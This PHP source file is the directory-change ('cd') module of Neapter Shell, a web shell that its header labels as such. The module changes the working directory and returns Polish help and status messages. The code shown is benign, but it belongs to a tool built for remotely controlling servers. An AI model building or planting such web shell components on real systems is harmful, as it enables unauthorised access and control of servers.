<?php

/**
 * Neapter Shell
 *
 * @category  WebShell
 * @package   NeapterShell
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright 2011-2016 Krzysztof Otręba
 *
 * @license http://www.gnu.org/licenses/gpl-3.0.txt GPL3
 * @link    http://github.com/krzotr/neapter-shell
 */

/**
 * Go to specified directory
 *
 * @category  WebShell
 * @package   NeapterShell
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright 2011-2016 Krzysztof Otręba
 *
 * @license http://www.gnu.org/licenses/gpl-3.0.txt GPL3
 * @link    http://github.com/krzotr/neapter-shell
 */
class ModuleCd extends ModuleAbstract
{
    /**
     * Get list of available commands
     *
     * @return array
     */
    public static function getCommands()
    {
        return array('cd');
    }

    /**
     * Get module version
     *
     * @return string
     */
    public static function getVersion()
    {
        return '1.0.0 2016-02-26 - <krzotr@gmail.com>';
    }

    /**
     * Get details module information
     *
     * @return string
     */
    public static function getHelp()
    {
        return <<<DATA
Zmiana aktualnego katalogu

    Użycie:
        cd sciezka

    Przykład:
        cd /tmp
DATA;
    }

    /**
     * Execute module
     *
     * @return string
     */
    public function get()
    {
        if ($this->oArgs->getNumberOfParams() !== 1) {
            return self::getHelp();
        }

        $sDir = $this->oArgs->getParam(0);

        if (@chdir($sDir)) {
            $this->oUtils->cacheSet('chdir', $sDir);

            return sprintf("Katalog zmieniono na:\r\n    %s", getcwd());
        }

        return 'Nie udało się zmienić katalogu!!!';
    }
}
